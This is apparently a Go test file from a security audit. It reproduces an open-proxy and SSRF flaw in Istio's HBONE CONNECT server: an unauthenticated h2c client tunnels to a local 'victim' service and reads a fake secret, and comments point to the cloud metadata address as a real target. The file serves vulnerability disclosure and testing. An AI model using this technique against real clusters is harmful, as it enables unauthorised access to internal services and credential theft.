// Reproducer: drives the REAL hbone.NewServer() handleConnect path.
// Demonstrates that the HBONE CONNECT server is an unauthenticated open proxy
// that dials an attacker-chosen host:port with no allowlist / SSRF guard.
//
// Run: go test -run . -v ./.zeroday/scratch/hbone/
package hbonezeroday

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"testing"
	"time"

	"golang.org/x/net/http2"

	"istio.io/istio/pkg/hbone"
)

// startVictim simulates a node-local / internal-only service (e.g. cloud metadata
// endpoint at 169.254.169.254, or a localhost-only admin service) that the remote
// HBONE client should NOT be able to reach directly, only the server's network can.
func startVictim(t *testing.T, banner string) string {
	t.Helper()
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("victim listen: %v", err)
	}
	go func() {
		for {
			c, err := l.Accept()
			if err != nil {
				return
			}
			go func(c net.Conn) {
				defer c.Close()
				fmt.Fprint(c, banner)
				// echo anything the client sends, prefixed
				br := bufio.NewReader(c)
				line, _ := br.ReadString('\n')
				if line != "" {
					fmt.Fprintf(c, "ACK:%s", line)
				}
			}(c)
		}
	}()
	t.Cleanup(func() { l.Close() })
	return l.Addr().String()
}

// startRealHBONEServer starts the ACTUAL production hbone.NewServer() in its
// default plaintext/h2c mode (TLS strongly recommended by README but optional,
// and even the TLS echo endpoint does NOT require a client cert).
func startRealHBONEServer(t *testing.T) string {
	t.Helper()
	srv := hbone.NewServer() // <-- code under audit: pkg/hbone/server.go
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("hbone listen: %v", err)
	}
	go func() { _ = srv.Serve(l) }()
	t.Cleanup(func() { _ = srv.Close(); l.Close() })
	return l.Addr().String()
}

// h2cConnect performs an HTTP/2 (h2c, cleartext) CONNECT to the hbone server with
// an ATTACKER-CHOSEN :authority (r.Host). No credentials of any kind are supplied.
// Returns the response and a writer pipe to stream bytes toward the target.
func h2cConnect(serverAddr, target string) (*http.Response, *io.PipeWriter, error) {
	tr := &http2.Transport{
		AllowHTTP: true,
		DialTLSContext: func(ctx context.Context, network, addr string, _ *tls.Config) (net.Conn, error) {
			return (&net.Dialer{}).DialContext(ctx, network, addr)
		},
	}
	pr, pw := io.Pipe()
	req, err := http.NewRequest(http.MethodConnect, "http://"+serverAddr, pr)
	if err != nil {
		return nil, nil, err
	}
	req.Host = target // <-- the only thing that selects the dial target on the server
	resp, err := tr.RoundTrip(req)
	if err != nil {
		return nil, nil, err
	}
	return resp, pw, nil
}

// TestHBONEOpenProxySSRF proves the open-proxy/SSRF: an unauthenticated h2c client
// tunnels TCP to an arbitrary address chosen purely via the CONNECT :authority.
func TestHBONEOpenProxySSRF(t *testing.T) {
	const secret = "SECRET-NODE-METADATA-TOKEN-abc123\n"
	victim := startVictim(t, secret)
	server := startRealHBONEServer(t)

	t.Logf("hbone server (real code) at %s; internal victim at %s", server, victim)

	resp, pw, err := h2cConnect(server, victim)
	if err != nil {
		t.Fatalf("CONNECT failed: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("CONNECT not accepted, status=%d (expected 200 => open proxy)", resp.StatusCode)
	}

	// Read the banner the internal service emitted, tunneled back through hbone.
	br := bufio.NewReader(resp.Body)
	got, err := br.ReadString('\n')
	if err != nil && got == "" {
		t.Fatalf("reading tunneled data: %v", err)
	}
	t.Logf("tunneled banner from internal victim via hbone: %q", strings.TrimSpace(got))
	if !strings.Contains(got, "SECRET-NODE-METADATA-TOKEN") {
		t.Fatalf("did not receive victim secret; got %q", got)
	}

	// Prove full bidirectional tunnel: send data toward the internal service.
	fmt.Fprint(pw, "hello-from-attacker\n")
	ack, _ := br.ReadString('\n')
	t.Logf("ack from internal victim: %q", strings.TrimSpace(ack))

	t.Logf("CONFIRMED: unauthenticated client reached internal address %s via hbone with zero authz/allowlist", victim)
	_ = pw.Close()
}

// TestHBONEArbitraryTargetNoValidation shows handleConnect performs NO validation
// of the target before dialing: loopback, link-local metadata IP, etc. are all
// attempted. We point at a closed port to confirm the server actually issues the
// dial (SSRF request) rather than rejecting the target up front.
func TestHBONEArbitraryTargetNoValidation(t *testing.T) {
	server := startRealHBONEServer(t)
	// 169.254.169.254 is the cloud metadata endpoint. We can't guarantee it exists in
	// this sandbox, so use a guaranteed-closed loopback port and assert the server
	// TRIED to dial it (503 from handleConnect's failed-dial branch) instead of
	// rejecting the target (which a validating proxy would do before dialing).
	closed := "127.0.0.1:1" // port 1, closed
	start := time.Now()
	resp, pw, err := h2cConnect(server, closed)
	if err != nil {
		t.Fatalf("CONNECT transport error: %v", err)
	}
	defer resp.Body.Close()
	_ = pw.Close()
	t.Logf("target=%s => status=%d after %v (503 => server attempted the dial, no target allowlist)",
		closed, resp.StatusCode, time.Since(start))
	if resp.StatusCode != http.StatusServiceUnavailable {
		t.Logf("note: status was %d", resp.StatusCode)
	}
}
